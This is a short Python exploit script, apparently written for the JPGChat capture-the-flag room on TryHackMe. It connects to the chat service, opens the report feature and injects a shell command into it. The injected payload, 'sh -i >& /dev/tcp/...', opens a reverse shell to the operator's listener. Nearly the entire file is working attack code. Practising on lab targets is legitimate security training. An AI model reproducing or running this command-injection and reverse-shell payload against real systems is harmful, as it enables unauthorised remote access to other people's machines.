#!/bin/env python3

import socket
import time
import sys

"""
This is my first exploit ever for JPGChat by Mozzie-jpg.
JPGChat GitHub Repository: https://github.com/Mozzie-jpg/JPChat
You can use this exploit in JPGChat room on TryHackMe.com
"""

if len(sys.argv) < 5:
	print("[*] Usage: python3 exploit.py <REMOTE_ADDRESS> <REMOTE_PORT> <LOCAL_ADDRESS LOCAL_PORT>")
	print("[*] Example: python3 exploit.py 192.168.100.55 3000 192.168.0.15 1337")
	exit(0)

remote_ip = sys.argv[1]
remote_port = sys.argv[2]
local_ip = sys.argv[3]
local_port = sys.argv[4]

print("[*] Don't forget to start your listener on port {local_port}!".format(local_port=local_port))
print("[*] Connecting to the target {remote_ip}:{remote_port}".format(remote_ip=remote_ip, remote_port=remote_port))
payload = '"H4CK3D"; sh -i >& /dev/tcp/{local_ip}/{local_port} 0>&1; echo "H4CK3D"\n'.format(local_ip=local_ip, local_port=local_port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((remote_ip, int(remote_port)))
s.recv(1024)
s.send(("[REPORT]\n").encode('utf-8'))
time.sleep(2)
s.recv(1024)
print("[*] Executing payload")
s.send((payload).encode('utf-8'))
time.sleep(2)
s.recv(1024)
s.send((payload).encode('utf-8'))
s.recv(1024)
print("[+] Reverse shell uploaded, check your netcat listener!")

